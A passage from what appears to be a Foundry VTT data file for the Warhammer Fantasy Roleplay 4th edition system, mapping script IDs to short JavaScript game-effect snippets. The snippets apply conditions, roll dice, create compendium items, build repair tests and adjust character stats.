this.effect.id});\n","R8ecKGRzOr4ThvVa":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Maintenance Crew Test';\nconst difficulty = 'hard';\nconst target = 80;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","R95pDZMHnD9iHAl8":"return args.skill?.name.includes(this.item.system.tests.value);","RDtJXji3hgcKnEBk":"let as = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.9h82z72XGo9tfgQS\")).toObject();\nlet hv = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.Nj3tC8A5fZ3zEdMR\")).toObject();\nlet ms = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.6w30u0VPsAicrqb5\")).toObject();\nlet ss = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.OEjUvJKi0xmBwbS2\")).toObject();\n\nas.name += \" (Sight)\";\n\nlet roll = (await new Roll(\"1d10\").roll());\nroll.toMessage(this.script.getChatData())\nlet items = []\n\nif (roll.total <= 2)\n{\n    items = items.concat([as]);\n}\nelse if (roll.total <= 4)\n{\n    items = items.concat([hv]);\n}\nelse if (roll.total <= 6)\n{\n    items = items.concat([ms]);\n}\nelse if (roll.total <= 8)\n{\n    items = items.concat([ss]);\n}\nelse if (roll.total <= 10)\n{\n    items = items.concat([as, hv, ms, ss]);\n}\n\nthis.actor.createEmbeddedDocuments(\"Item\", items, {fromEffect: this.effect.id})","RHyBLYT5oHf7EPnG":"let skills = this.actor.itemTypes.skill.filter(i => i.name.includes(game.i18n.localize(\"NAME.Melee\")))\n\nlet skill = await ItemDialog.create(skills, 1, \"Select the skill used by the weapon\")\nlet group = game.wfrp4e.utility.extractParenthesesText(skill[0]?.name)\nlet groupKey = game.wfrp4e.utility.findKey(group, game.wfrp4e.config.weaponGroups)\n\nlet weapon = {\n\tname : this.effect.name,\n\ttype : \"weapon\",\n\timg : this.effect.img,\n\tsystem : {\n\t\t\"damage.value\" : this.actor.system.characteristics.wp.bonus,\n\t\t\"weaponGroup.value\" : groupKey || \"basic\",\n\t\t\"twohanded.value\" : [\"polearm\", \"twohanded\"].includes(groupKey),\n\t\t\"reach.value\" : \"average\",\n\t\t\"qualities.value\" : [{name : \"magical\"}]\n\t},\n}\n\nItem.implementation.create(foundry.utils.expandObject(weapon), {parent : this.actor, fromEffect : this.effect.id})\nthis.script.scriptNotification(\"Item created. Further customization must be done manually within the Item's sheet\");","RI8crJxeD8JLDwMh":"return args.weapon?.system?.weaponGroup?.value != \"fencing\"","RJpglw5eVRM1f9t0":"args.wounds *= 5","RKIFGN583PQnqHGk":"if (args.opposedTest.result.hitloc.value == \"body\" && args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"bleeding\", 2)\n    this.script.scriptMessage(\"Gained 2 Bleeding Conditions\")\n}","RNHrSTfMLXm5sXkC":"return [\"ws\", \"bs\", \"s\", \"ag\"].includes(args.characteristic)","RNr9CwyvLhlnwD2h":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Sail\"));","ROXCqAFSTLouJniL":"if (args.test.spell.name == \"Warp Lightning\")\n{\n    if (args.test.result.minormis || args.test.result.majormis || args.test.result.catastrophicmis)\n    {\n        this.script.scriptMessage(`<strong>${this.item.name}</strong> Overloads!`)\n    }\n}","RPqgRUkiLY5thVbC":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Strength';\nconst difficulty = 'average';\nconst target = 10;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","RSsGiDFibuqg3sHr":"let diseaseIndex = game.packs\n.filter(i => i.metadata.type == \"Item\")\n.reduce((acc, pack) => acc.concat(pack.index.contents), [])\n.filter(i => i.type == \"disease\")\n.map(i => {\n\ti.id = i._id\n\treturn i\n})\n\nlet choice = await ItemDialog.create(diseaseIndex , 1, \"Choose a Disease\")\n\nif (choice[0])\n{\n\tawait this.item.updateSource({\"system.specification.value\" : choice[0].name})\n}","RZlMkxJz5apn0mUj":"return args.item?.system.attackType != \"ranged\"","RlhOAKfN0ghrrooR":"let holed = this.actor.appliedEffects.filter(e => e.name.includes(\"Holed\"));\n\nfor (let effect of holed) {\n  await effect.update({name: effect.name.replace(/\\d+/, rating => parseInt(rating) * 2)});\n}\n\nthis.script.scriptNotification(`Holed Ratings of ${this.actor.name} have been doubled.`);","Rnpw6UQdJifLeuna":"this.effect.updateSource({\"flags.wfrp4e.applicationData.type\" : \"crew\"})","RprZWlnopSqZt7KZ":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"));","RqWnhnwFxaHubgiA":"await args.actor.addCondition(\"blinded\");\nawait args.actor.addCondition(\"deafened\");\nawait args.actor.addCondition(\"stunned\");","RrchOMpEdIvceJxl":"return args.skill?.name == \"Stealth (Rural)\"","RsWXCcYHONf3ANlD":"this.actor.addCondition(\"stunned\", 1);\n","RuW1PWUFxIbbSlIm":"return ![\"t\", \"wp\", \"ag\", \"i\", \"int\"].includes(args.characteristic)","RvipIYj9H7n4UDMe":"   let characteristics = {\n            \"ws\" : -10,\n            \"bs\" : -10,\n            \"s\" : -5,\n            \"t\" : -5,\n            \"i\" : -10,\n            \"ag\" : -10,\n            \"dex\" : -10,\n            \"int\" : 0,\n            \"wp\" : 0,\n            \"fel\" : 0\n        }\n        let skills = []\n        let skillAdvancements = []\n        let talents = []\n        let trappings = []\n        let items = []\n\n        let updateObj = this.actor.toObject();\n        \n        for (let ch in characteristics)\n        {\n            updateObj.system.characteristics[ch].modifier += characteristics[ch];\n        }\n        \n        for (let index = 0; index < skills.length; index++)\n        {\n            let skill = skills[index]\n            let skillItem;\n            skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n            if (skillItem)\n                skillItem.system.advances.value += skillAdvancements[index]\n            else \n            {\n                skillItem = await game.wfrp4e.utility.findSkill(skill)\n                skillItem = skillItem.toObject();\n                skillItem.system.advances.value = skillAdvancements[index];\n                items.push(skillItem);\n            }\n        }\n        \n        for (let talent of talents)\n        {\n            let talentItem = await game.wfrp4e.utility.findTalent(talent)\n            if (talentItem)\n            {\n                items.push(talentItem.toObject());\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n            }\n        }\n        \n        for (let trapping of trappings) \n        {\n            let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n            if (trappingItem)\n            {\n                trappingItem = trappingItem.toObject()\n        \n                equip(trappingItem)\n        \n                items.push(trappingItem);\n            }\n            else \n            {\n                ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n            }\n        }\n       \n        \n        await this.actor.update(updateObj)\n        this.actor.createEmbeddedDocuments(\"Item\", items);\n        \n        function equip(item)\n        {\n            if (item.type == \"armour\")\n                item.system.worn.value = true\n            else if (item.type == \"weapon\")\n                item.system.equipped = true\n            else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n                item.system.worn = true\n        }","RwMw848y13Jq2L4f":"let test = await this.actor.setupSkill(\"Endurance\", {fields : {difficulty : \"difficult\"}, appendTitle : ` - ${this.effect.name}`});\nawait test.roll();\nif (test.failed)\n{\n\tawait this.actor.addCondition(\"blinded\");\n}\n\nlet msg = ``\nlet armour = args.actor.itemTypes.armour.filter(i => i.system.isMetal && i.system.isEquipped);\nfor(let item of armour)\n{\n\tfor(let key in item.system.AP)\n\t{\n\t\tlet AP = item.system.AP[key]\n\t\tlet damage = Math.floor(AP / 2);\n\t\tawait item.system.damageItem(damage, [key]);\n\t}\n\tmsg += `<p><strong>${item.name}</strong> AP reduced by half</p>`\n}\nif (msg)\n{\n\tthis.script.scriptMessage(msg, {speaker : {alias : args.actor.name}});\n}","S1QihXuvdEVzeRtB":"let dice = await new Roll(\"1d10\").roll()\nlet roll = dice.total\nlet talent \nlet message\nlet modifier = 0\n\nif (roll <= 3)\n{\n    item = await fromUuid(\"Compendium.wfrp4e-core.items.mNoCuaVbFBflfO6X\")\n}\n\nelse if (roll <= 6)\n{\n    item = await fromUuid(\"Compendium.wfrp4e-core.items.OEjUvJKi0xmBwbS2\")\n    modifier = -3\n}\n\nelse if (roll <= 9)\n{\n    item = await fromUuid(\"Compendium.wfrp4e-core.items.mdPGZsn2396dEpOf\")\n    modifier = -3\n}\n\nelse if (roll = 10)\n{\n    item = await fromUuid(\"Compendium.wfrp4e-core.items.qdMbxW09FUoYBzmB\")\n    modifier = -5\n}\n\nmessage = `${roll} Rolled, gain ${item.name}, ${modifier} Strength`\ndice.toMessage(this.script.getChatData())\n\nlet changes = foundry.utils.duplicate(this.effect.changes)\nchanges[0].value = modifier\n\nthis.effect.updateSource({changes})\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], {fromEffect : this.effect.id})\n\nthis.script.scriptNotification(message)","S3DCTw4yJ85eSaKp":"this.actor.setupCharacteristic(\"s\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(test => test.roll())","S3Dev4hleOYqDNe9":"if (args.test.options.healWounds) {\n if (args.test.succeeded) \n {\n   let wounds = this.actor.characteristics.int.bonus + Number(args.test.result.SL)\n   if (args.test.options.fieldDressing && args.test.result.reversed)\n   {\n      wounds = this.actor.characteristics.int.bonus + Math.min(1, Number(args.test.result.SL))\n   }\n\targs.test.result.woundsHealed = wounds\n\targs.test.result.other.push(`<b>${this.actor.name}</b> healed <b>${wounds}</b> wounds of the patient.`)\n   }\n   else if (this.actor.characteristics.int.bonus + Number(args.test.result.SL) < 0)\n   {\n      args.test.result.other.push(`The patient contracts a @UUID[Compendium.wfrp4e-core.items.Item.1hQuVFZt9QnnbWzg]{Minor Infection}.`)\n   }\n}","S4793DLFhjMxpM8x":"return ![\"ws\", \"bs\"].includes(args.characteristic) && !args.item?.system.attackType && !args.options.dodge","S6tUyFJvGMV19mvP":"this.actor.status.addArmour(2, {source: this.effect})","S95QqpX1cZyIVCPy":"if (parseInt(this.item.system.specification.value) > 0)\n{\n\tthis.actor.system.status.ward.value = parseInt(this.item.system.specification.value);\n}\n\n","SGr50Hq1AHIEzIFN":"let choice = await ItemDialog.create(ItemDialog.objectToArray({\n    int : game.wfrp4e.config.characteristics.int,\n    fel : game.wfrp4e.config.characteristics.fel\n}, this.effect.img), 1, \"Choose Characteristic\");\n\nthis.effect.updateSource({\"flags.wfrp4e.characteristic\" : choice[0].id})","SLy1Fs3oXcHgFgjK":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\")\nlet data = item.toObject();\nlet value = foundry.utils.getProperty(this.effect.sourceTest, \"result.overcast.usage.other.current\") || 1\ndata.system.specification.value = value\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","SO4Aa9argKbuO9rQ":"args.prefillModifiers.modifier -= 20","SPOkFWZWziZk5b7A":"return args.item?.system?.attackType != \"melee\"","SRmfstEs278bP9Pz":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.yRhhOlt18COq4e1q\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","SSqGxyN9hw0HDmED":"this.actor.addCondition(\"prone\");","SWIJjM2RCmzfr64u":"if (args.test.result.hitloc.result == \"head\" && args.test.result.critical)\n{\n args.test.result.critModifier = args.test.result.critModifier ? args.test.result.critModifier + 40 : 40\n\n  args.test.result.critical += ` (+${args.test.result.critModifier})`\n}\n","SefcrhXsdYGFcCW6":"args.actor.system.details.move.value -= 3;\nargs.actor.system.details.man -= 2;\nargs.actor.system.status.carries.max *= 2;","SrCHfOJFZwDickqa":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"average\"}});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}","Ssn21dxoMQiqD1y4":"return args.type == \"cast\" && args.item.lore.value == \"fire\"","StAderQaQQsxb6Rv":"let target = await game.wfrp4e.tables.rollTable(\"fixations\")\nif (target)\n{\n    this.script.scriptNotification(target.result);\n    let hatred = this.actor.items.find(i => i.getFlag(\"wfrp4e\", \"fromEffect\") == this.effect.id)\n    if (hatred)\n    {\n        hatred.update({\"system.specification.value\" : target.result})\n    }\n}","SvFKt9hMcFQjeILA":"args.actor.addCondition(\"entangled\", this.effect.sourceTest.result.overcast.usage.other.current)","T3RfSt3VMEat3iDD":"return args.skill?.name !== game.i18n.localize(\"NAME.Perception\");","T5fiTzhXEQAv9Drf":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.rlDZZTj5PXjuRXa2\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key;\nawait this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n\nlet location = this.item.system.location.key;\n\nif (location)\n{\n    let dropped = this.item.system.weaponsAtLocation;\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}","T74FEjfFrh3f6MKv":"args.wpb = args.sb;","TAw9vXnfyIAl5DGs":"if (this.item.system.quantity.value)\n{\n    game.wfrp4e.utility.postCorruptionTest(\"minor\", this.script.getChatData());\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectData : [this.item.effects.contents[1].convertToApplied()]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","TBpNFRL5uehs0fze":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectData : [this.item.effects.contents[0]]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","TCtXPvDpbfz1yrVZ":"let choice1 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Basic)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 20\n                }\n            }\n        }\n    }\n]\nlet choice2 = [\n    {\n        type : \"skill\",\n        name : \"Melee (Two-Handed)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 20\n                }\n            }\n        }\n    }\n]\n\nlet choice = await new Promise((resolve, reject) => {\n    new Dialog({\n        title : \"Choice\",\n        content : \n        `<p>\n        Select your choice\n        </p>\n        <ol>\n        <li>Melee (Basic)</li>\n        <li>Melee (Two-Handed)</li>\n        </ol> \n        `,\n        buttons : {\n            1 : {\n                label : \"Basic\",\n                callback : () => {\n                    resolve(choice1)\n                }\n            },\n            2 : {\n                label : \"Two-Handed\",\n                callback : () => {\n                    resolve(choice2)\n                }\n            }\n        }\n    }).render(true)\n}) \n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","TEiNj5FgkoD3YbhS":"this.actor.hasCondition(\"bleeding\")?.delete()","TGN070HeJLl3gSMY":"let test = await this.actor.setupCharacteristic(\"ag\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, context: { failure: \"Goes Prone\" }})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\");\n}","TNWmIkuubqBn38he":"this.effect.deleteCreatedItems();","TOyQLrugFGzwc5nY":"return !(args.skill?.name.includes(game.i18n.localize(\"NAME.Melee\")) || args.item?.isMelee || args.options.corruption);","TQRL4mZhZohXg1Au":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\ntest.roll();","TU2xjbJ0zFtytF3J":"return args.skill?.name == game.i18n.localize(\"NAME.CharmAnimal\");","TY0xSQ00XXyEr49r":"args.fields.slBonus += 1;","TcqumwUFAL6V0cty":"if (this.item.getFlag(\"wfrp4e\", \"failedCool\"))\n{\n    this.item.system.AP = {\n        \"head\": 0,\n        \"lArm\": 0,\n        \"rArm\": 0,\n        \"lLeg\": 0,\n        \"rLeg\": 0,\n        \"body\": 0\n      }\n}","TdjlJro0RRVSh8g8":"return args.skill?.name != game.i18n.localize(\"NAME.Gamble\") && args.skill?.name != game.i18n.localize(\"NAME.SleightOfHand\");","TmaS8o33825QUMrx":"let stomp = game.wfrp4e.config.systemItems.stomp;\nlet test = await this.actor.setupTrait(stomp)\nawait test.roll();","TnFobCxG4pxlYmKr":"let gorCharacteristics = {\n    \"ws\": 45,\n    \"bs\": 30,\n    \"s\": 35,\n    \"t\": 45,\n    \"i\": 30,\n    \"ag\": 35,\n    \"dex\": 25,\n    \"int\": 25,\n    \"wp\": 30,\n    \"fel\": 25\n}\nfor (let char in this.actor.characteristics) {\n    if (this.actor.characteristics[char].initial < gorCharacteristics[char])\n        this.actor.characteristics[char].initial = gorCharacteristics[char]\n}","ToKlHDAjJOsC51ag":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.GlShFJF2TpsNh1FX\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n   \nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}});\nawait test.roll();\nif (test.failed)\n{\n    args.actor.addCondition(\"unconscious\")\n}","TpZItJ5Ugbazaobd":"let locations = [];\n\nwhile (locations.length < 2)\n{\n    let loc = await game.wfrp4e.tables.rollTable(\"hitloc\", {hideDSN : true})\n    if (!locations.includes(loc.result))\n    {\n        locations.push(loc.result);\n    }\n}\n\nlocationText = locations.map(i => game.wfrp4e.config.locations[i]).join(\", \")\n\nthis.item.updateSource({name : this.item.name += ` (${locationText})`, \"flags.wfrp4e.locations\" : locations})\nthis.effect.updateSource({\"flags.wfrp4e.locations\" : locations})","Tq45Nd8J3eTvHT41":"return args.skill?.name != game.i18n.localize(\"NAME.Perception\") && args.skill?.name != game.i18n.localize(\"NAME.SetTrap\");","TrIYdcG3jDER4WgY":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.xsGbDFqK2qh7lsIj\")\nlet data = item.toObject();\ndata.system.specification.value = \"Minor\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","TwgdEucxcHloc4cX":"let choice1 = [\n    {\n        type : \"armour\",\n        name : \"Mail Chausses\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coat\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coif\"\n    },\n]\nlet choice2 = [\n    {\n        type : \"armour\",\n        name : \"Mail Chausses\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coat\"\n    },\n    {\n        type : \"armour\",\n        name : \"Mail Coif\"\n    },\n    {\n        type : \"armour\",\n        name : \"Leather Leggings\"\n    },\n    {\n        type : \"armour\",\n        name : \"Leather Skullcap\"\n    },\n    {\n        type : \"armour\",\n        name : \"Leather Jack\"\n    },\n]\nlet choice3 = [\n    {\n        type : \"armour\",\n        name : \"Plate Breastplate\"\n    },\n    {\n        type : \"armour\",\n        name : \"Plate Bracers\"\n    },\n    {\n        type : \"armour\",\n        name : \"Plate Helm\"\n    },\n    {\n        type : \"armour\",\n        name : \"Plate Leggings\"\n    },\n]\n\nlet choice = await new Promise((resolve, reject) => {\n    new Dialog({\n        title : \"Choice\",\n        content : \n        `<p>\n        Select your choice\n        </p>\n        <ol>\n        <li>Mail</li>\n        <li>Mail & Leather</li>\n        <li>Plate</li>\n        </ol> \n        `,\n        buttons : {\n            1 : {\n                label : \"Mail\",\n                callback : () => {\n                    resolve(choice1)\n                }\n            },\n            2 : {\n                label : \"Mail & Leather\",\n                callback : () => {\n                    resolve(choice2)\n                }\n            },\n            3 : {\n                label : \"Plate\",\n                callback : () => {\n                    resolve(choice3)\n                }\n            }\n        }\n    }).render(true)\n}) \n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(foundry.utils.mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${c.name}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","TwwKxFjK6TNGKbRB":"this.script.scriptMessage(await this.actor.applyBasicDamage(12, {damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg : true}))\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty: \"hard\"}})\nawait test.roll();\nif (test.failed)\n{\n   this.actor.addSystemEffect(\"cold1\")\n}\n\n","TxfmxDGBj04AQQpt":"let weapon = args.opposedTest.defenderTest.weapon\nif (\n    !args.opposedTest.result.swapped && \n    args.opposedTest.result.winner == \"defender\" && \n    args.opposedTest.attackerTest.result.damage && \n    weapon && \n    weapon?.system.properties.qualities.fast\n    )\n{\n    await args.opposedTest.swap(this.effect.label);\n}","TzgmYRXFXRspIo1i":"this.effect.delete();","U1RUcgP8LD2qeGTm":"return !args.options.reload","U1UpSRJOSjPpO4HS":"let mutations = await game.wfrp4e.utility.findAll(\"mutation\", \"Loading Mutations\")\nlet roll = Math.floor(CONFIG.Dice.randomUniform() * mutations.length);\nthis.actor.createEmbeddedDocuments(\"Item\", [mutations[roll]]);\nthis.script.scriptNotification(`Added ${mutations[roll].name}`)","U26XMie3Kjoddisj":"let stunned = this.actor.hasCondition(\"stunned\")\nif (stunned)\n{\n   this.script.scriptNotification(`Cleared 1 Stunned Condition`)\n   this.actor.removeCondition(\"stunned\");\n}\nelse \n{\n\tthis.script.scriptNotification(`No Stunned Conditions`)\n}","U2xKn7R1gm8kiQm8":"this.actor.hasCondition(\"broken\")?.delete();\n\nlet item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.8pVzgPkgWpTJvfhG\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","U4A8FDNmwBGTuQZO":"if (args.attacker.has(\"Undead\") && !args.attacker.has(\"Ethereal\"))\n{\n    args.totalWoundLoss =  Math.floor(args.totalWoundLoss / 2)\n    args.modifiers.other.push({label : this.effect.name, details : \"Halved\", value : \"× 0.5\"})\n}","U5ndCwcJ1s3Ns26w":"args.item.system.qualities.value.push({name : \"magical\"});\nargs.item.system.damage.value += ` + ${parseInt(this.effect.sourceTest.result.SL)}`;\nargs.item.name += ` (${this.effect.name})`","U78c4oUjKwyUu6jT":"return (args.skill?.name != game.i18n.localize(\"NAME.Perception\") && args.characteristic != \"fel\")","U9xh2wriSqCosugW":"if (args.test.options.stag)\n{\n\tif (parseInt(args.test.result.SL) < 0 || args.test.failed)\n\t{\n\t\tif (parseInt(args.test.result.SL) < 0)\n\t\t{\n\t\t\targs.test.result.SL = \"+0\";\n\t\t\targs.test.result.description = game.i18n.localize(\"ROLL.MarginalSuccess\");\n\t\t}\n\t\targs.test.result.outcome = \"success\"\n        args.test.result.other.push(`<strong>${this.effect.name}</strong>: Minimum +0 SL`)\n\t}\n}","UC6G3pFQwzUhrw6F":"return args.skill?.name != game.i18n.localize(\"NAME.CharmAnimal\");","UDPsaymtZf39UsMk":"\n                            let fatigued = this.actor.hasCondition(\"fatigued\")\n                            if (!fatigued)\n                            {\n                                this.actor.addCondition(\"fatigued\")\n                                ui.notifications.notify(\"Fatigued added to \" + this.actor.name + \" which cannot be removed until the Malaise symptom is gone.\")\n                            }","UH5MIzqi2MvEqTwj":"if (args.totalWoundLoss > 0)\n{\n    let roll = await new Roll(\"1d10\").roll();\n    roll.toMessage(this.script.getChatData());\n    args.totalWoundLoss += roll.total;\n    args.modifiers.other.push({label : this.effect.name, value : roll.total})\n}","ULmZMLezDamerN04":"let spells = await game.wfrp4e.utility.findAll(\"spell\", \"Loading Spells\")\n\nlet lore = (await game.wfrp4e.tables.rollTable(\"random-caster\", {hideDSN: true})).text\nthis.script.scriptNotification(lore)\nif (lore == \"GM's Choice\") {\n   return\n}\n\nelse if (lore == \"Arcane Magic\") {\n    lore = \"Arcane\"\n}\n\nelse if (lore == \"Petty Magic\") {\n    lore = \"petty\"\n}\n\nelse {\n    lore = lore.toLowerCase();\n}\n\nlet spellsWithLore = []\nif (lore == \"Arcane\") {\n    spellsWithLore = spells.filter(i => !i.system.lore.value)\n}\nelse {\n    spellsWithLore = spells.filter(i => i.system.lore.value == lore)\n}\n\nlet selectedSpell = spellsWithLore[Math.floor(CONFIG.Dice.randomUniform() * spellsWithLore.length)]\nItem.implementation.create(selectedSpell.toObject(), { parent: this.actor}).then(item => {\n    this.actor.setupCast(item).then(test => test.roll());\n})","UQtXuQmUlTyDKqhe":"let characteristics = {\n    \"ws\" : 10,\n    \"bs\" : 20,\n    \"s\" : 0,\n    \"t\" : 10,\n    \"i\" : 15,\n    \"ag\" : 0,\n    \"dex\" : 0,\n    \"int\" : 40,\n    \"wp\" : 45,\n    \"fel\" : 10\n}\nlet skills = [\"Channelling\", \"Cool\", \"Intimidate\", \"Language (Magick)\", \"Language (Nehekharan)\", \"Lore (Magic)\", \"Perception\"]\nlet skillAdvancements = [10, 20, 15, 15, 10, 10, 10]\nlet talents = [\"Arcane Magic\", \"Hardy\", \"Menacing\", \"Petty Magic\", \"Read/Write\", \"Second Sight\"]\nlet trappings = [\"Hand Weapon\"]\nlet specialItems = [ \n    {name: \"Mouldering Robes\", type: \"trapping\", trappingType: \"clothingAccessories\" }, \n    {name: \"Pouches containing ritual components\", type: \"trapping\", trappingType: \"clothingAccessories\" }, \n    {name: \"Staff\", type: \"weapon\", damage: \"SB+2\"}, \n    {name: \"Dark Magic (Necromancy)\", type: \"talent\"},\n]   \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await 